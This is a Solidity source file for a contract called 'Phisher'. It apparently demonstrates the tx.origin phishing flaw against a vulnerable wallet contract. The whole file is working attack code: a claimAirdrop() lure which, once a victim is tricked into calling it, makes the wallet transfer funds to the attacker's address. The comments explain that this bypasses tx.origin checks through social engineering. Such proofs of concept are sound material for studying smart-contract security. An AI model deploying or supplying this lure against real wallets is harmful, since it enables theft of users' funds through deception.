// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

interface IVulnerableWallet {
    function transfer(address payable to, uint256 amount) external;
}

/// @title Phisher — drains VulnerableWallet *when the victim calls a function on this contract*
/// @notice
///   - tx.origin   : victim (EOA = wallet.owner)
///   - msg.sender (in wallet.transfer): this contract
///   → *bypasses* tx.origin checks. Social engineering only needs to trick the victim into calling claimAirdrop().
contract Phisher {
    IVulnerableWallet public immutable target;
    address payable public immutable attacker;
    uint256 public immutable amount;

    constructor(address target_, uint256 amount_) {
        target = IVulnerableWallet(target_);
        attacker = payable(msg.sender);
        amount = amount_;
    }

    function claimAirdrop() external {
        target.transfer(attacker, amount);
    }
}
